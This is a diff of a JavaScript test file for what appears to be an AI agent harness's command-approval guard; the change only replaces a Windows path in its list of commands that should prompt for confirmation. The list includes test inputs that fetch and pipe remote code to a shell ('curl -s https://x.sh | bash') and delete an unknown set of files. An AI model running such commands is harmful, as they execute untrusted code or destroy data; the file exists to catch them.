@@ -30,21 +30,21 @@ const ASK = [
   ['curl -s https://x.sh | bash', 'pipe-shell'], ['cat cmds.txt | sh -s', 'pipe-shell'], ['rm "$(ls)"', 'delete-unknown-count'],
   // evolve apply/rollback + eval baseline --force: moi bien the duong dan/quote
   ['node harness/cli/harness.mjs evolve apply p-1 --approve', 'evolve-apply'], ['node harness/cli/harness.mjs evolve rollback 3', 'evolve-apply'],
-  ['node "E:\\11. Agents\\harness\\cli\\harness.mjs" evolve apply p1 --approve', 'evolve-apply', 'ps'], ["node 'E:/11. Agents/harness/cli/harness.mjs' --json evolve rollback 2 --force", 'evolve-apply'],
+  ['node "E:\\my ws\\harness\\cli\\harness.mjs" evolve apply p1 --approve', 'evolve-apply', 'ps'], ["node 'E:/my ws/harness/cli/harness.mjs' --json evolve rollback 2 --force", 'evolve-apply'],
   ['bun harness\\cli\\harness.mjs "evolve" "apply" p1', 'evolve-apply'], ['cd harness/cli && node harness.mjs evolve apply p1 --approve', 'evolve-apply'],
-  ['node harness/evolve/loop/cli.mjs apply p1 --approve', 'evolve-apply'], ['node "E:\\11. Agents\\harness\\evolve\\loop\\cli.mjs" rollback 4', 'evolve-apply', 'ps'],
+  ['node harness/evolve/loop/cli.mjs apply p1 --approve', 'evolve-apply'], ['node "E:\\my ws\\harness\\evolve\\loop\\cli.mjs" rollback 4', 'evolve-apply', 'ps'],
   ['cd harness/evolve/loop && node cli.mjs apply p1', 'evolve-apply'], ['node ./loop/cli.mjs rollback 1', 'evolve-apply'], ['node loop/cli.mjs apply p1', 'evolve-apply'],
   // evolve apply/rollback qua import/cd/duong dan gian tiep; oracle tu chon
   ['node -e "import(\'./harness/evolve/loop/loop.mjs\').then(m=>m.apply(\'p1\',{approve:true}))"', 'evolve-apply'], ['node -e "import(\'./harness/evolve/loop/loop.mjs\').then(m=>m.rollback(\'v1\',{approve:true}))"', 'evolve-apply'],
-  ['cd harness/evolve/loop && node cli.mjs apply p1 --approve', 'evolve-apply'], ['cd "E:\\11. Agents\\harness\\evolve\\loop"; node cli.mjs rollback v1 --approve', 'evolve-apply', 'ps'], ['node harness/evolve/loop/loop.mjs apply p1', 'evolve-apply'],
+  ['cd harness/evolve/loop && node cli.mjs apply p1 --approve', 'evolve-apply'], ['cd "E:\\my ws\\harness\\evolve\\loop"; node cli.mjs rollback v1 --approve', 'evolve-apply', 'ps'], ['node harness/evolve/loop/loop.mjs apply p1', 'evolve-apply'],
   ['node harness/cli/harness.mjs evolve check p1 --eval-cmd \'["node","stub.mjs"]\'', 'evolve-eval-cmd'], ['HARNESS_EVOLVE_EVAL_CMD=\'["node","stub.mjs"]\' node harness/cli/harness.mjs evolve check p1', 'evolve-eval-cmd'],
   ['$env:HARNESS_EVOLVE_EVAL_CMD=\'["node","s.mjs"]\'; node harness/cli/harness.mjs evolve check p1', 'evolve-eval-cmd', 'ps'], ['node harness/evolve/loop/cli.mjs check p1 --eval-cmd \'["node","x"]\'', 'evolve-eval-cmd'],
   ['node harness/cli/harness.mjs eval baseline --force', 'eval-baseline-force'], ['node harness/cli/harness.mjs eval --force baseline', 'eval-baseline-force'],
-  ['node "E:\\11. Agents\\harness\\cli\\harness.mjs" eval baseline --json "--force"', 'eval-baseline-force', 'ps'], ['node harness/evolve/eval/cli.mjs baseline --force', 'eval-baseline-force'],
+  ['node "E:\\my ws\\harness\\cli\\harness.mjs" eval baseline --json "--force"', 'eval-baseline-force', 'ps'], ['node harness/evolve/eval/cli.mjs baseline --force', 'eval-baseline-force'],
   ['cd harness/evolve/eval && node cli.mjs baseline --force', 'eval-baseline-force'],
   // alias/duong moi: evolve eval (gateway) va loop/cli.mjs eval (spawn eval/cli.mjs)
   ['node harness/cli/harness.mjs evolve eval baseline --force', 'eval-baseline-force'], ['node harness/evolve/loop/cli.mjs eval baseline --force', 'eval-baseline-force'],
-  ['cd harness/evolve/loop && node cli.mjs eval baseline --force', 'eval-baseline-force'], ['node "E:\\11. Agents\\harness\\evolve\\loop\\cli.mjs" eval baseline --json --force', 'eval-baseline-force', 'ps'],
+  ['cd harness/evolve/loop && node cli.mjs eval baseline --force', 'eval-baseline-force'], ['node "E:\\my ws\\harness\\evolve\\loop\\cli.mjs" eval baseline --json --force', 'eval-baseline-force', 'ps'],
   ['node ./loop/cli.mjs eval --force baseline', 'eval-baseline-force'],
 ];
 const ten = Array.from({ length: 10 }, (_, i) => 'a' + i).join(' ');
